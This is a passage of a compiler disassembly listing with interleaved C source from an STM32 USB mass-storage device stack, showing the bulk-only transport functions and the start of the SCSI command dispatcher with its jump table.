 800973e:	d024      	beq.n	800978a <MSC_BOT_CBW_Decode+0x12e>
             (hmsc->bot_state != USBD_BOT_DATA_OUT) &&
 8009740:	68fb      	ldr	r3, [r7, #12]
 8009742:	7a1b      	ldrb	r3, [r3, #8]
    else if ((hmsc->bot_state != USBD_BOT_DATA_IN) &&
 8009744:	2b01      	cmp	r3, #1
 8009746:	d020      	beq.n	800978a <MSC_BOT_CBW_Decode+0x12e>
             (hmsc->bot_state != USBD_BOT_LAST_DATA_IN))
 8009748:	68fb      	ldr	r3, [r7, #12]
 800974a:	7a1b      	ldrb	r3, [r3, #8]
             (hmsc->bot_state != USBD_BOT_DATA_OUT) &&
 800974c:	2b03      	cmp	r3, #3
 800974e:	d01c      	beq.n	800978a <MSC_BOT_CBW_Decode+0x12e>
    {
      if (hmsc->bot_data_length > 0U)
 8009750:	68fb      	ldr	r3, [r7, #12]
 8009752:	68db      	ldr	r3, [r3, #12]
 8009754:	2b00      	cmp	r3, #0
 8009756:	d009      	beq.n	800976c <MSC_BOT_CBW_Decode+0x110>
      {
        MSC_BOT_SendData(pdev, hmsc->bot_data, hmsc->bot_data_length);
 8009758:	68fb      	ldr	r3, [r7, #12]
 800975a:	f103 0110 	add.w	r1, r3, #16
 800975e:	68fb      	ldr	r3, [r7, #12]
 8009760:	68db      	ldr	r3, [r3, #12]
 8009762:	461a      	mov	r2, r3
 8009764:	6878      	ldr	r0, [r7, #4]
 8009766:	f000 f819 	bl	800979c <MSC_BOT_SendData>
      if (hmsc->bot_data_length > 0U)
 800976a:	e00f      	b.n	800978c <MSC_BOT_CBW_Decode+0x130>
      }
      else if (hmsc->bot_data_length == 0U)
 800976c:	68fb      	ldr	r3, [r7, #12]
 800976e:	68db      	ldr	r3, [r3, #12]
 8009770:	2b00      	cmp	r3, #0
 8009772:	d104      	bne.n	800977e <MSC_BOT_CBW_Decode+0x122>
      {
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_PASSED);
 8009774:	2100      	movs	r1, #0
 8009776:	6878      	ldr	r0, [r7, #4]
 8009778:	f000 f84c 	bl	8009814 <MSC_BOT_SendCSW>
      if (hmsc->bot_data_length > 0U)
 800977c:	e006      	b.n	800978c <MSC_BOT_CBW_Decode+0x130>
      }
      else
      {
        MSC_BOT_Abort(pdev);
 800977e:	6878      	ldr	r0, [r7, #4]
 8009780:	f000 f888 	bl	8009894 <MSC_BOT_Abort>
      if (hmsc->bot_data_length > 0U)
 8009784:	e002      	b.n	800978c <MSC_BOT_CBW_Decode+0x130>
    return;
 8009786:	bf00      	nop
 8009788:	e000      	b.n	800978c <MSC_BOT_CBW_Decode+0x130>
      }
    }
    else
    {
      return;
 800978a:	bf00      	nop
    }
  }
}
 800978c:	3710      	adds	r7, #16
 800978e:	46bd      	mov	sp, r7
 8009790:	bd80      	pop	{r7, pc}
 8009792:	bf00      	nop
 8009794:	2000010b 	.word	0x2000010b
 8009798:	43425355 	.word	0x43425355

0800979c <MSC_BOT_SendData>:
  * @param  buf: pointer to data buffer
  * @param  len: Data Length
  * @retval None
  */
static void  MSC_BOT_SendData(USBD_HandleTypeDef *pdev, uint8_t *pbuf, uint32_t len)
{
 800979c:	b580      	push	{r7, lr}
 800979e:	b086      	sub	sp, #24
 80097a0:	af00      	add	r7, sp, #0
 80097a2:	60f8      	str	r0, [r7, #12]
 80097a4:	60b9      	str	r1, [r7, #8]
 80097a6:	607a      	str	r2, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80097a8:	68fb      	ldr	r3, [r7, #12]
 80097aa:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80097ae:	68fb      	ldr	r3, [r7, #12]
 80097b0:	32b0      	adds	r2, #176	; 0xb0
 80097b2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80097b6:	617b      	str	r3, [r7, #20]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 80097b8:	697b      	ldr	r3, [r7, #20]
 80097ba:	2b00      	cmp	r3, #0
 80097bc:	d023      	beq.n	8009806 <MSC_BOT_SendData+0x6a>
  {
    return;
  }

  length = MIN(hmsc->cbw.dDataLength, len);
 80097be:	697b      	ldr	r3, [r7, #20]
 80097c0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80097c4:	699b      	ldr	r3, [r3, #24]
 80097c6:	687a      	ldr	r2, [r7, #4]
 80097c8:	4293      	cmp	r3, r2
 80097ca:	bf28      	it	cs
 80097cc:	4613      	movcs	r3, r2
 80097ce:	613b      	str	r3, [r7, #16]

  hmsc->csw.dDataResidue -= len;
 80097d0:	697b      	ldr	r3, [r7, #20]
 80097d2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80097d6:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 80097d8:	687b      	ldr	r3, [r7, #4]
 80097da:	1ad3      	subs	r3, r2, r3
 80097dc:	697a      	ldr	r2, [r7, #20]
 80097de:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 80097e2:	6393      	str	r3, [r2, #56]	; 0x38
  hmsc->csw.bStatus = USBD_CSW_CMD_PASSED;
 80097e4:	697b      	ldr	r3, [r7, #20]
 80097e6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80097ea:	2200      	movs	r2, #0
 80097ec:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c
  hmsc->bot_state = USBD_BOT_SEND_DATA;
 80097f0:	697b      	ldr	r3, [r7, #20]
 80097f2:	2204      	movs	r2, #4
 80097f4:	721a      	strb	r2, [r3, #8]

  (void)USBD_LL_Transmit(pdev, MSCInEpAdd, pbuf, length);
 80097f6:	4b06      	ldr	r3, [pc, #24]	; (8009810 <MSC_BOT_SendData+0x74>)
 80097f8:	7819      	ldrb	r1, [r3, #0]
 80097fa:	693b      	ldr	r3, [r7, #16]
 80097fc:	68ba      	ldr	r2, [r7, #8]
 80097fe:	68f8      	ldr	r0, [r7, #12]
 8009800:	f003 fbe4 	bl	800cfcc <USBD_LL_Transmit>
 8009804:	e000      	b.n	8009808 <MSC_BOT_SendData+0x6c>
    return;
 8009806:	bf00      	nop
}
 8009808:	3718      	adds	r7, #24
 800980a:	46bd      	mov	sp, r7
 800980c:	bd80      	pop	{r7, pc}
 800980e:	bf00      	nop
 8009810:	2000010a 	.word	0x2000010a

08009814 <MSC_BOT_SendCSW>:
  * @param  pdev: device instance
  * @param  status : CSW status
  * @retval None
  */
void  MSC_BOT_SendCSW(USBD_HandleTypeDef *pdev, uint8_t CSW_Status)
{
 8009814:	b580      	push	{r7, lr}
 8009816:	b084      	sub	sp, #16
 8009818:	af00      	add	r7, sp, #0
 800981a:	6078      	str	r0, [r7, #4]
 800981c:	460b      	mov	r3, r1
 800981e:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009820:	687b      	ldr	r3, [r7, #4]
 8009822:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009826:	687b      	ldr	r3, [r7, #4]
 8009828:	32b0      	adds	r2, #176	; 0xb0
 800982a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800982e:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009830:	68fb      	ldr	r3, [r7, #12]
 8009832:	2b00      	cmp	r3, #0
 8009834:	d024      	beq.n	8009880 <MSC_BOT_SendCSW+0x6c>
  {
    return;
  }

  hmsc->csw.dSignature = USBD_BOT_CSW_SIGNATURE;
 8009836:	68fb      	ldr	r3, [r7, #12]
 8009838:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800983c:	461a      	mov	r2, r3
 800983e:	4b12      	ldr	r3, [pc, #72]	; (8009888 <MSC_BOT_SendCSW+0x74>)
 8009840:	6313      	str	r3, [r2, #48]	; 0x30
  hmsc->csw.bStatus = CSW_Status;
 8009842:	68fb      	ldr	r3, [r7, #12]
 8009844:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009848:	461a      	mov	r2, r3
 800984a:	78fb      	ldrb	r3, [r7, #3]
 800984c:	f882 303c 	strb.w	r3, [r2, #60]	; 0x3c
  hmsc->bot_state = USBD_BOT_IDLE;
 8009850:	68fb      	ldr	r3, [r7, #12]
 8009852:	2200      	movs	r2, #0
 8009854:	721a      	strb	r2, [r3, #8]

  (void)USBD_LL_Transmit(pdev, MSCInEpAdd, (uint8_t *)&hmsc->csw,
 8009856:	4b0d      	ldr	r3, [pc, #52]	; (800988c <MSC_BOT_SendCSW+0x78>)
 8009858:	7819      	ldrb	r1, [r3, #0]
 800985a:	68fb      	ldr	r3, [r7, #12]
 800985c:	f503 5281 	add.w	r2, r3, #4128	; 0x1020
 8009860:	3210      	adds	r2, #16
 8009862:	230d      	movs	r3, #13
 8009864:	6878      	ldr	r0, [r7, #4]
 8009866:	f003 fbb1 	bl	800cfcc <USBD_LL_Transmit>
                         USBD_BOT_CSW_LENGTH);

  /* Prepare EP to Receive next Cmd */
  (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, (uint8_t *)&hmsc->cbw,
 800986a:	4b09      	ldr	r3, [pc, #36]	; (8009890 <MSC_BOT_SendCSW+0x7c>)
 800986c:	7819      	ldrb	r1, [r3, #0]
 800986e:	68fb      	ldr	r3, [r7, #12]
 8009870:	f503 5280 	add.w	r2, r3, #4096	; 0x1000
 8009874:	3210      	adds	r2, #16
 8009876:	231f      	movs	r3, #31
 8009878:	6878      	ldr	r0, [r7, #4]
 800987a:	f003 fbdf 	bl	800d03c <USBD_LL_PrepareReceive>
 800987e:	e000      	b.n	8009882 <MSC_BOT_SendCSW+0x6e>
    return;
 8009880:	bf00      	nop
                               USBD_BOT_CBW_LENGTH);
}
 8009882:	3710      	adds	r7, #16
 8009884:	46bd      	mov	sp, r7
 8009886:	bd80      	pop	{r7, pc}
 8009888:	53425355 	.word	0x53425355
 800988c:	2000010a 	.word	0x2000010a
 8009890:	2000010b 	.word	0x2000010b

08009894 <MSC_BOT_Abort>:
  * @param  pdev: device instance
  * @retval status
  */

static void  MSC_BOT_Abort(USBD_HandleTypeDef *pdev)
{
 8009894:	b580      	push	{r7, lr}
 8009896:	b084      	sub	sp, #16
 8009898:	af00      	add	r7, sp, #0
 800989a:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800989c:	687b      	ldr	r3, [r7, #4]
 800989e:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80098a2:	687b      	ldr	r3, [r7, #4]
 80098a4:	32b0      	adds	r2, #176	; 0xb0
 80098a6:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80098aa:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 80098ac:	68fb      	ldr	r3, [r7, #12]
 80098ae:	2b00      	cmp	r3, #0
 80098b0:	d02c      	beq.n	800990c <MSC_BOT_Abort+0x78>
  {
    return;
  }

  if ((hmsc->cbw.bmFlags == 0U) &&
 80098b2:	68fb      	ldr	r3, [r7, #12]
 80098b4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80098b8:	7f1b      	ldrb	r3, [r3, #28]
 80098ba:	2b00      	cmp	r3, #0
 80098bc:	d10f      	bne.n	80098de <MSC_BOT_Abort+0x4a>
      (hmsc->cbw.dDataLength != 0U) &&
 80098be:	68fb      	ldr	r3, [r7, #12]
 80098c0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80098c4:	699b      	ldr	r3, [r3, #24]
  if ((hmsc->cbw.bmFlags == 0U) &&
 80098c6:	2b00      	cmp	r3, #0
 80098c8:	d009      	beq.n	80098de <MSC_BOT_Abort+0x4a>
      (hmsc->bot_status == USBD_BOT_STATUS_NORMAL))
 80098ca:	68fb      	ldr	r3, [r7, #12]
 80098cc:	7a5b      	ldrb	r3, [r3, #9]
      (hmsc->cbw.dDataLength != 0U) &&
 80098ce:	2b00      	cmp	r3, #0
 80098d0:	d105      	bne.n	80098de <MSC_BOT_Abort+0x4a>
  {
    (void)USBD_LL_StallEP(pdev, MSCOutEpAdd);
 80098d2:	4b10      	ldr	r3, [pc, #64]	; (8009914 <MSC_BOT_Abort+0x80>)
 80098d4:	781b      	ldrb	r3, [r3, #0]
 80098d6:	4619      	mov	r1, r3
 80098d8:	6878      	ldr	r0, [r7, #4]
 80098da:	f003 faa7 	bl	800ce2c <USBD_LL_StallEP>
  }

  (void)USBD_LL_StallEP(pdev, MSCInEpAdd);
 80098de:	4b0e      	ldr	r3, [pc, #56]	; (8009918 <MSC_BOT_Abort+0x84>)
 80098e0:	781b      	ldrb	r3, [r3, #0]
 80098e2:	4619      	mov	r1, r3
 80098e4:	6878      	ldr	r0, [r7, #4]
 80098e6:	f003 faa1 	bl	800ce2c <USBD_LL_StallEP>

  if (hmsc->bot_status == USBD_BOT_STATUS_ERROR)
 80098ea:	68fb      	ldr	r3, [r7, #12]
 80098ec:	7a5b      	ldrb	r3, [r3, #9]
 80098ee:	2b02      	cmp	r3, #2
 80098f0:	d10d      	bne.n	800990e <MSC_BOT_Abort+0x7a>
  {
    (void)USBD_LL_StallEP(pdev, MSCInEpAdd);
 80098f2:	4b09      	ldr	r3, [pc, #36]	; (8009918 <MSC_BOT_Abort+0x84>)
 80098f4:	781b      	ldrb	r3, [r3, #0]
 80098f6:	4619      	mov	r1, r3
 80098f8:	6878      	ldr	r0, [r7, #4]
 80098fa:	f003 fa97 	bl	800ce2c <USBD_LL_StallEP>
    (void)USBD_LL_StallEP(pdev, MSCOutEpAdd);
 80098fe:	4b05      	ldr	r3, [pc, #20]	; (8009914 <MSC_BOT_Abort+0x80>)
 8009900:	781b      	ldrb	r3, [r3, #0]
 8009902:	4619      	mov	r1, r3
 8009904:	6878      	ldr	r0, [r7, #4]
 8009906:	f003 fa91 	bl	800ce2c <USBD_LL_StallEP>
 800990a:	e000      	b.n	800990e <MSC_BOT_Abort+0x7a>
    return;
 800990c:	bf00      	nop
  }
}
 800990e:	3710      	adds	r7, #16
 8009910:	46bd      	mov	sp, r7
 8009912:	bd80      	pop	{r7, pc}
 8009914:	2000010b 	.word	0x2000010b
 8009918:	2000010a 	.word	0x2000010a

0800991c <MSC_BOT_CplClrFeature>:
  * @param  epnum: endpoint index
  * @retval None
  */

void  MSC_BOT_CplClrFeature(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 800991c:	b580      	push	{r7, lr}
 800991e:	b084      	sub	sp, #16
 8009920:	af00      	add	r7, sp, #0
 8009922:	6078      	str	r0, [r7, #4]
 8009924:	460b      	mov	r3, r1
 8009926:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009928:	687b      	ldr	r3, [r7, #4]
 800992a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800992e:	687b      	ldr	r3, [r7, #4]
 8009930:	32b0      	adds	r2, #176	; 0xb0
 8009932:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009936:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009938:	68fb      	ldr	r3, [r7, #12]
 800993a:	2b00      	cmp	r3, #0
 800993c:	d01d      	beq.n	800997a <MSC_BOT_CplClrFeature+0x5e>
  {
    return;
  }

  if (hmsc->bot_status == USBD_BOT_STATUS_ERROR) /* Bad CBW Signature */
 800993e:	68fb      	ldr	r3, [r7, #12]
 8009940:	7a5b      	ldrb	r3, [r3, #9]
 8009942:	2b02      	cmp	r3, #2
 8009944:	d10c      	bne.n	8009960 <MSC_BOT_CplClrFeature+0x44>
  {
    (void)USBD_LL_StallEP(pdev, MSCInEpAdd);
 8009946:	4b10      	ldr	r3, [pc, #64]	; (8009988 <MSC_BOT_CplClrFeature+0x6c>)
 8009948:	781b      	ldrb	r3, [r3, #0]
 800994a:	4619      	mov	r1, r3
 800994c:	6878      	ldr	r0, [r7, #4]
 800994e:	f003 fa6d 	bl	800ce2c <USBD_LL_StallEP>
    (void)USBD_LL_StallEP(pdev, MSCOutEpAdd);
 8009952:	4b0e      	ldr	r3, [pc, #56]	; (800998c <MSC_BOT_CplClrFeature+0x70>)
 8009954:	781b      	ldrb	r3, [r3, #0]
 8009956:	4619      	mov	r1, r3
 8009958:	6878      	ldr	r0, [r7, #4]
 800995a:	f003 fa67 	bl	800ce2c <USBD_LL_StallEP>
 800995e:	e00f      	b.n	8009980 <MSC_BOT_CplClrFeature+0x64>
  }
  else if (((epnum & 0x80U) == 0x80U) && (hmsc->bot_status != USBD_BOT_STATUS_RECOVERY))
 8009960:	f997 3003 	ldrsb.w	r3, [r7, #3]
 8009964:	2b00      	cmp	r3, #0
 8009966:	da0a      	bge.n	800997e <MSC_BOT_CplClrFeature+0x62>
 8009968:	68fb      	ldr	r3, [r7, #12]
 800996a:	7a5b      	ldrb	r3, [r3, #9]
 800996c:	2b01      	cmp	r3, #1
 800996e:	d006      	beq.n	800997e <MSC_BOT_CplClrFeature+0x62>
  {
    MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 8009970:	2101      	movs	r1, #1
 8009972:	6878      	ldr	r0, [r7, #4]
 8009974:	f7ff ff4e 	bl	8009814 <MSC_BOT_SendCSW>
 8009978:	e002      	b.n	8009980 <MSC_BOT_CplClrFeature+0x64>
    return;
 800997a:	bf00      	nop
 800997c:	e000      	b.n	8009980 <MSC_BOT_CplClrFeature+0x64>
  }
  else
  {
    return;
 800997e:	bf00      	nop
  }
}
 8009980:	3710      	adds	r7, #16
 8009982:	46bd      	mov	sp, r7
 8009984:	bd80      	pop	{r7, pc}
 8009986:	bf00      	nop
 8009988:	2000010a 	.word	0x2000010a
 800998c:	2000010b 	.word	0x2000010b

08009990 <SCSI_ProcessCmd>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
int8_t SCSI_ProcessCmd(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *cmd)
{
 8009990:	b580      	push	{r7, lr}
 8009992:	b086      	sub	sp, #24
 8009994:	af00      	add	r7, sp, #0
 8009996:	60f8      	str	r0, [r7, #12]
 8009998:	460b      	mov	r3, r1
 800999a:	607a      	str	r2, [r7, #4]
 800999c:	72fb      	strb	r3, [r7, #11]
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800999e:	68fb      	ldr	r3, [r7, #12]
 80099a0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80099a4:	68fb      	ldr	r3, [r7, #12]
 80099a6:	32b0      	adds	r2, #176	; 0xb0
 80099a8:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80099ac:	613b      	str	r3, [r7, #16]

  if (hmsc == NULL)
 80099ae:	693b      	ldr	r3, [r7, #16]
 80099b0:	2b00      	cmp	r3, #0
 80099b2:	d102      	bne.n	80099ba <SCSI_ProcessCmd+0x2a>
  {
    return -1;
 80099b4:	f04f 33ff 	mov.w	r3, #4294967295
 80099b8:	e168      	b.n	8009c8c <SCSI_ProcessCmd+0x2fc>
  }

  switch (cmd[0])
 80099ba:	687b      	ldr	r3, [r7, #4]
 80099bc:	781b      	ldrb	r3, [r3, #0]
 80099be:	2baa      	cmp	r3, #170	; 0xaa
 80099c0:	f000 8144 	beq.w	8009c4c <SCSI_ProcessCmd+0x2bc>
 80099c4:	2baa      	cmp	r3, #170	; 0xaa
 80099c6:	f300 8153 	bgt.w	8009c70 <SCSI_ProcessCmd+0x2e0>
 80099ca:	2ba8      	cmp	r3, #168	; 0xa8
 80099cc:	f000 812c 	beq.w	8009c28 <SCSI_ProcessCmd+0x298>
 80099d0:	2ba8      	cmp	r3, #168	; 0xa8
 80099d2:	f300 814d 	bgt.w	8009c70 <SCSI_ProcessCmd+0x2e0>
 80099d6:	2b5a      	cmp	r3, #90	; 0x5a
 80099d8:	f300 80c0 	bgt.w	8009b5c <SCSI_ProcessCmd+0x1cc>
 80099dc:	2b00      	cmp	r3, #0
 80099de:	f2c0 8147 	blt.w	8009c70 <SCSI_ProcessCmd+0x2e0>
 80099e2:	2b5a      	cmp	r3, #90	; 0x5a
 80099e4:	f200 8144 	bhi.w	8009c70 <SCSI_ProcessCmd+0x2e0>
 80099e8:	a201      	add	r2, pc, #4	; (adr r2, 80099f0 <SCSI_ProcessCmd+0x60>)
 80099ea:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 80099ee:	bf00      	nop
 80099f0:	08009b63 	.word	0x08009b63
 80099f4:	08009c71 	.word	0x08009c71
 80099f8:	08009c71 	.word	0x08009c71
 80099fc:	08009b75 	.word	0x08009b75
 8009a00:	08009c71 	.word	0x08009c71
 8009a04:	08009c71 	.word	0x08009c71
 8009a08:	08009c71 	.word	0x08009c71
 8009a0c:	08009c71 	.word	0x08009c71
 8009a10:	08009c71 	.word	0x08009c71
 8009a14:	08009c71 	.word	0x08009c71
 8009a18:	08009c71 	.word	0x08009c71
 8009a1c:	08009c71 	.word	0x08009c71
 8009a20:	08009c71 	.word	0x08009c71
 8009a24:	08009c71 	.word	0x08009c71
 8009a28:	08009c71 	.word	0x08009c71
 8009a2c:	08009c71 	.word	0x08009c71
 8009a30:	08009c71 	.word	0x08009c71
 8009a34:	08009c71 	.word	0x08009c71
 8009a38:	08009b87 	.word	0x08009b87
 8009a3c:	08009c71 	.word	0x08009c71
 8009a40:	08009c71 	.word	0x08009c71
 8009a44:	08009c71 	.word	0x08009c71
 8009a48:	08009c71 	.word	0x08009c71
 8009a4c:	08009c71 	.word	0x08009c71
 8009a50:	08009c71 	.word	0x08009c71
 8009a54:	08009c71 	.word	0x08009c71
 8009a58:	08009bbd 	.word	0x08009bbd
 8009a5c:	08009b99 	.word	0x08009b99
 8009a60:	08009c71 	.word	0x08009c71
 8009a64:	08009c71 	.word	0x08009c71
 8009a68:	08009bab 	.word	0x08009bab
 8009a6c:	08009c71 	.word	0x08009c71
 8009a70:	08009c71 	.word	0x08009c71
 8009a74:	08009c71 	.word	0x08009c71
 8009a78:	08009c71 	.word	0x08009c71
 8009a7c:	08009be1 	.word	0x08009be1
 8009a80:	08009c71 	.word	0x08009c71
 8009a84:	08009bf3 	.word	0x08009bf3
 8009a88:	08009c71 	.word	0x08009c71
 8009a8c:	08009c71 	.word	0x08009c71
 8009a90:	08009c17 	.word	0x08009c17
 8009a94:	08009c71 	.word	0x08009c71
 8009a98:	08009c3b 	.word	0x08009c3b
 8009a9c:	08009c71 	.word	0x08009c71
 8009aa0:	08009c71 	.word	0x08009c71
 8009aa4:	08009c71 	.word	0x08009c71
 8009aa8:	08009c71 	.word	0x08009c71
 8009aac:	08009c5f 	.word	0x08009c5f
 8009ab0:	08009c71 	.word	0x08009c71
 8009ab4:	08009c71 	.word	0x08009c71
 8009ab8:	08009c71 	.word	0x08009c71
 8009abc:	08009c71 	.word	0x08009c71
 8009ac0:	08009c71 	.word	0x08009c71
 8009ac4:	08009c71 	.word	0x08009c71
 8009ac8:	08009c71 	.word	0x08009c71
 8009acc:	08009c71 	.word	0x08009c71
 8009ad0:	08009c71 	.word	0x08009c71
 8009ad4:	08009c71 	.word	0x08009c71
 8009ad8:	08009c71 	.word	0x08009c71
 8009adc:	08009c71 	.word	0x08009c71
 8009ae0:	08009c71 	.word	0x08009c71
 8009ae4:	08009c71 	.word	0x08009c71
 8009ae8:	08009c71 	.word	0x08009c71
 8009aec:	08009c71 	.word	0x08009c71
 8009af0:	08009c71 	.word	0x08009c71
 8009af4:	08009c71 	.word	0x08009c71
 8009af8:	08009c71 	.word	0x08009c71
 8009afc:	08009c71 	.word	0x08009c71
 8009b00:	08009c71 	.word	0x08009c71
 8009b04:	08009c71 	.word	0x08009c71
 8009b08:	08009c71 	.word	0x08009c71
 8009b0c:	08009c71 	.word	0x08009c71
 8009b10:	08009c71 	.word	0x08009c71
 8009b14:	08009c71 	.word	0x08009c71
 8009b18:	08009c71 	.word	0x08009c71
 8009b1c:	08009c71 	.word	0x08009c71
 8009b20:	08009c71 	.word	0x08009c71
 8009b24:	08009c71 	.word	0x08009c71
 8009b28:	08009c71 	.word	0x08009c71
 8009b2c:	08009c71 	.word	0x08009c71
 8009b30:	08009c71 	.word	0x08009c71
 8009b34:	08009c71 	.word	0x08009c71
 8009b38:	08009c71 	.word	0x08009c71
 8009b3c:	08009c71 	.word	0x08009c71
 8009b40:	08009c71 	.word	0x08009c71
 8009b44:	08009c71 	.word	0x08009c71
 8009b48:	08009c71 	.word	0x08009c71
 8009b4c:	08009c71 	.word	0x08009c71
 8009b50:	08009c71 	.word	0x08009c71
 8009b54:	08009c71 	.word	0x08009c71
 8009b58:	08009bcf 	.word	0x08009bcf
 8009b5c:	2b9e      	cmp	r3, #158	; 0x9e
 8009b5e:	d051      	beq.n	8009c04 <SCSI_ProcessCmd+0x274>
 8009b60:	e086      	b.n	8009c70 <SCSI_ProcessCmd+0x2e0>
  {
    case SCSI_TEST_UNIT_READY:
      ret = SCSI_TestUnitReady(pdev, lun, cmd);
 8009b62:	7afb      	ldrb	r3, [r7, #11]
 8009b64:	687a      	ldr	r2, [r7, #4]
 8009b66:	4619      	mov	r1, r3
 8009b68:	68f8      	ldr	r0, [r7, #12]
 8009b6a:	f000 f893 	bl	8009c94 <SCSI_TestUnitReady>
 8009b6e:	4603      	mov	r3, r0
 8009b70:	75fb      	strb	r3, [r7, #23]
      break;
 8009b72:	e089      	b.n	8009c88 <SCSI_ProcessCmd+0x2f8>

    case SCSI_REQUEST_SENSE:
      ret = SCSI_RequestSense(pdev, lun, cmd);
 8009b74:	7afb      	ldrb	r3, [r7, #11]
 8009b76:	687a      	ldr	r2, [r7, #4]
 8009b78:	4619      	mov	r1, r3
 8009b7a:	68f8      	ldr	r0, [r7, #12]
 8009b7c:	f000 fb9a 	bl	800a2b4 <SCSI_RequestSense>
 8009b80:	4603      	mov	r3, r0
 8009b82:	75fb      	strb	r3, [r7, #23]
      break;
 8009b84:	e080      	b.n	8009c88 <SCSI_ProcessCmd+0x2f8>

    case SCSI_INQUIRY:
      ret = SCSI_Inquiry(pdev, lun, cmd);
 8009b86:	7afb      	ldrb	r3, [r7, #11]
 8009b88:	687a      	ldr	r2, [r7, #4]
 8009b8a:	4619      	mov	r1, r3
 8009b8c:	68f8      	ldr	r0, [r7, #12]
 8009b8e:	f000 f8df 	bl	8009d50 <SCSI_Inquiry>
 8009b92:	4603      	mov	r3, r0
 8009b94:	75fb      	strb	r3, [r7, #23]
      break;
 8009b96:	e077      	b.n	8009c88 <SCSI_ProcessCmd+0x2f8>

    case SCSI_START_STOP_UNIT:
      ret = SCSI_StartStopUnit(pdev, lun, cmd);
 8009b98:	7afb      	ldrb	r3, [r7, #11]
 8009b9a:	687a      	ldr	r2, [r7, #4]
 8009b9c:	4619      	mov	r1, r3
 8009b9e:	68f8      	ldr	r0, [r7, #12]
 8009ba0:	f000 fc7e 	bl	800a4a0 <SCSI_StartStopUnit>
 8009ba4:	4603      	mov	r3, r0
 8009ba6:	75fb      	strb	r3, [r7, #23]
      break;
 8009ba8:	e06e      	b.n	8009c88 <SCSI_ProcessCmd+0x2f8>

    case SCSI_ALLOW_MEDIUM_REMOVAL:
      ret = SCSI_AllowPreventRemovable(pdev, lun, cmd);
 8009baa:	7afb      	ldrb	r3, [r7, #11]
 8009bac:	687a      	ldr	r2, [r7, #4]
 8009bae:	4619      	mov	r1, r3
 8009bb0:	68f8      	ldr	r0, [r7, #12]
 8009bb2:	f000 fcd2 	bl	800a55a <SCSI_AllowPreventRemovable>
 8009bb6:	4603      	mov	r3, r0
 8009bb8:	75fb      	strb	r3, [r7, #23]
      break;
 8009bba:	e065      	b.n	8009c88 <SCSI_ProcessCmd+0x2f8>

    case SCSI_MODE_SENSE6:
      ret = SCSI_ModeSense6(pdev, lun, cmd);
 8009bbc:	7afb      	ldrb	r3, [r7, #11]
 8009bbe:	687a      	ldr	r2, [r7, #4]
